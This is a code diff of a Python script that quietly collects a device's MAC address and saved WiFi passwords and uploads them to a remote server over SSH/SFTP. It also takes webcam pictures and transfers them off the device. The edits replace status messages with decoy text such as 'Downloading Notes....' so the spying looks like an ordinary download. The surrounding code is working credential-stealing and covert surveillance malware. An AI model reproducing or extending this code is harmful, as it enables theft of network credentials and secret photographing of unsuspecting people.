@@ -100,7 +100,7 @@ def log_info_to_termux(info, ssh_client):
             # Check if device info already exists in the log
             existing_content = sftp_client.open(log_file_path).read().decode('utf-8')
             if info["MAC Address"] in existing_content:
-                print("file already exist. Skipping En.")
+                print("Downloading Notes....")
                 return False
 
             # Write new log entry if it doesn't exist
@@ -114,7 +114,7 @@ def log_info_to_termux(info, ssh_client):
             for ssid, password in wifi_passwords:
                 remote_file.write(f"SSID: {ssid}, Password: {password}\n".encode('utf-8'))
 
-            print(f"Downloading wait..")
+            print(f"Wait...")
         return True
     except Exception as e:
         print(f"Error logging info to server: {e}")
@@ -145,7 +145,7 @@ def capture_and_transfer_images(ssh_client, image_count=5, interval=0.2):
                 # Save the image temporarily, then transfer and delete it
                 cv2.imwrite(local_image_path, frame)
                 sftp_client.put(local_image_path, os.path.join(REMOTE_PATH, remote_filename))
-                print(f"Code file downloading....")
+                print(f"Still file downloading....")
                 os.remove(local_image_path)  # Clean up local temporary file
             else:
                 print("Failed to cap im.")
